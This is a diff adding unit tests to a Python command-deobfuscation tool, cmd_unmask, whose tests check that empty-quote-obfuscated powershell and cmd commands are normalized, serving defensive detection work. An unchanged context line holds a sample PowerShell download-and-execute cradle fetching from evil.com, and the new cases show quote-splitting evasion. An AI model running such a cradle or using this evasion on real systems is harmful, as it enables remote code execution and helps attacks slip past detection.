@@ -52,6 +52,34 @@ class TestQuoteAwareShellNormalizer(unittest.TestCase):
         self.assertEqual(verdict.provenance_chain[0].technique, "shell_normalizer")
         self.assertIn("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a`b^c')\"", verdict.primary_unmasked_payload)
 
+    def test_empty_quote_obfuscation_guards(self) -> None:
+        from cmd_unmask.ingestion import ingest_single_command
+
+        cases = [
+            ('p""o""w""e""r""s""h""e""l""l -nop -c whoami', 'powershell -nop -c whoami'),
+            ('pow""er""shell -c whoami', 'powershell -c whoami'),
+            ('c""m""d /c whoami', 'cmd /c whoami'),
+            ('po""wershell -nop', 'powershell -nop'),
+        ]
+        for raw, expected in cases:
+            with self.subTest(raw=raw):
+                res = normalize_shell(raw)
+                self.assertEqual(res.normalized_text, expected)
+                rec = ingest_single_command(raw)
+                verdict = unmask_command(rec.command_text)
+                self.assertEqual(verdict.primary_unmasked_payload, expected)
+
+    def test_legit_empty_quoted_argument_preserved(self) -> None:
+        from cmd_unmask.ingestion import ingest_single_command
+
+        raw = 'cmd /c echo "" done'
+        res = normalize_shell(raw)
+        self.assertEqual(res.normalized_text, raw)
+        rec = ingest_single_command(raw)
+        self.assertEqual(rec.command_text, raw)
+        verdict = unmask_command(rec.command_text)
+        self.assertEqual(verdict.primary_unmasked_payload, raw)
+
 
 if __name__ == "__main__":
     unittest.main()
